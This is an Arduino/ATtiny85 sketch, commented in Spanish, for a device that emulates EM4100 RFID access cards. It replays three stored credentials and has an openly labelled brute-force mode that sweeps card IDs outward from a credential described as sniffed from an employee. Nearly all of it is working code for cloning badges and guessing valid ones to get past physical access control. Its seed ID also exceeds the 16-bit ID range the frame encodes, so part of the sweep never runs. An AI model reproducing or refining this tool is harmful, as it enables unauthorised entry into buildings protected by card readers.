// Emulador EM4100 - ATtiny85 @ 16MHz PLL
// PB0 (pin 5) -> resistencia 10k -> base 2N3904 -> bobina
// Pulsadores: PB1, PB2, PB3, PB4 -> GND (INPUT_PULLUP)
//
// BTN 1-3: emula tarjeta fija (igual que v2/v3)
// BTN 4:   ATAQUE DE EMISION SECUENCIAL
//          Barre el Card ID *hacia afuera* desde una credencial semilla
//          conocida (SEED_FAC/SEED_ID), probando primero los IDs mas
//          cercanos, que son los mas probables por el alta secuencial de
//          tarjetas. El facility code queda fijo (es por edificio/sede).
//
// Mejora sobre v3: v3 iteraba una lista hardcodeada. Aca el barrido es
// parametrico (semilla + radio) y en orden de probabilidad decreciente.

#define COIL_PIN    0   // PB0, pin fisico 5
#define BTN_1       3   // PB3, pin fisico 2
#define BTN_2       4   // PB4, pin fisico 3
#define BTN_3       1   // PB1, pin fisico 6
#define BTN_4       2   // PB2, pin fisico 7

#define HALF_BIT_US 256 // 16MHz PLL interno

// cuantas veces se repite cada credencial antes de pasar a la siguiente
// (la lectora necesita varias tramas para sincronizar y validar paridad)
#define REPS_PER_CARD 8

// *** CONFIGURAR ACA LOS 3 IDs FIJOS (BTN 1-3) ***
#define FAC_1  01
#define ID_1   1111

#define FAC_2  125
#define ID_2   64646

#define FAC_3  64
#define ID_3   12356
// *************************************************

// *** ATAQUE DE EMISION SECUENCIAL (BTN 4) ***
// Semilla: una credencial conocida (p.ej. sniffeada de un empleado).
#define SEED_FAC    64
#define SEED_ID     123456
// Radio del barrido: prueba SEED_ID-RADIO .. SEED_ID+RADIO
#define SWEEP_RADIUS 100
// *********************************************

struct Card {
  uint16_t facility;
  uint32_t id;
};

const Card CARDS[3] = {
  { FAC_1, ID_1 },
  { FAC_2, ID_2 },
  { FAC_3, ID_3 }
};

const uint8_t BTNS[4] = { BTN_1, BTN_2, BTN_3, BTN_4 };

int tag[64];

uint8_t parity_nibble(uint8_t nibble) {
  uint8_t p = 0;
  for (int i = 0; i < 4; i++) p ^= (nibble >> i) & 1;
  return p;
}

void build_em4100_frame(uint16_t facility, uint32_t id) {
  uint8_t data[4] = {
    (uint8_t)((facility >> 8) & 0xFF),
    (uint8_t)( facility       & 0xFF),
    (uint8_t)((id       >> 8) & 0xFF),
    (uint8_t)( id             & 0xFF)
  };

  uint8_t bytes[5] = { 0x06, data[0], data[1], data[2], data[3] };
  uint8_t col_par[4] = {0, 0, 0, 0};
  int idx = 0;

  for (int i = 0; i < 9; i++) tag[idx++] = 1;

  for (int b = 0; b < 5; b++) {
    uint8_t hi = (bytes[b] >> 4) & 0x0F;
    for (int i = 3; i >= 0; i--) {
      uint8_t bit = (hi >> i) & 1;
      tag[idx++] = bit;
      col_par[3 - i] ^= bit;
    }
    tag[idx++] = parity_nibble(hi);

    uint8_t lo = bytes[b] & 0x0F;
    for (int i = 3; i >= 0; i--) {
      uint8_t bit = (lo >> i) & 1;
      tag[idx++] = bit;
      col_par[3 - i] ^= bit;
    }
    tag[idx++] = parity_nibble(lo);
  }

  for (int i = 0; i < 4; i++) tag[idx++] = col_par[i];
  tag[idx++] = 0;
}

void send_manchester_bit(int bit) {
  int m = 1 ^ bit;
  digitalWrite(COIL_PIN, m ? LOW : HIGH);
  delayMicroseconds(HALF_BIT_US);
  digitalWrite(COIL_PIN, m ? HIGH : LOW);
  delayMicroseconds(HALF_BIT_US);
}

void send_frame() {
  for (int rep = 0; rep < 5; rep++) {
    for (int i = 0; i < 64; i++) {
      send_manchester_bit(tag[i]);
    }
  }
}

// Transmite una credencial REPS_PER_CARD veces, abortando si sueltan BTN 4.
// Devuelve false si se solto el boton (para cortar el barrido).
bool emit_card(uint16_t fac, uint32_t id) {
  build_em4100_frame(fac, id);
  for (int r = 0; r < REPS_PER_CARD; r++) {
    if (digitalRead(BTN_4) == HIGH) return false;
    send_frame();
    delay(10);
  }
  return true;
}

// Barrido secuencial hacia afuera desde la semilla:
// SEED_ID, SEED_ID+1, SEED_ID-1, SEED_ID+2, SEED_ID-2, ...
// Prueba primero los IDs mas cercanos (mas probables por alta secuencial).
void do_sequential_sweep() {
  // offset 0: la propia semilla
  if (!emit_card(SEED_FAC, SEED_ID)) return;

  for (int32_t off = 1; off <= SWEEP_RADIUS; off++) {
    int32_t up   = (int32_t)SEED_ID + off;
    int32_t down = (int32_t)SEED_ID - off;

    if (up <= 0xFFFF) {
      if (!emit_card(SEED_FAC, (uint32_t)up)) return;
    }
    if (down >= 0) {
      if (!emit_card(SEED_FAC, (uint32_t)down)) return;
    }
  }
}

void setup() {
  pinMode(COIL_PIN, OUTPUT);
  digitalWrite(COIL_PIN, LOW);
  for (int i = 0; i < 4; i++) {
    pinMode(BTNS[i], INPUT_PULLUP);
  }
}

void loop() {
  // BTN 1-3: tarjetas fijas
  for (int i = 0; i < 3; i++) {
    if (digitalRead(BTNS[i]) == LOW) {
      build_em4100_frame(CARDS[i].facility, CARDS[i].id);
      while (digitalRead(BTNS[i]) == LOW) {
        send_frame();
        delay(10);
      }
      digitalWrite(COIL_PIN, LOW);
      break;
    }
  }

  // BTN 4: ataque de emision secuencial
  if (digitalRead(BTN_4) == LOW) {
    do_sequential_sweep();
    digitalWrite(COIL_PIN, LOW);
  }
}
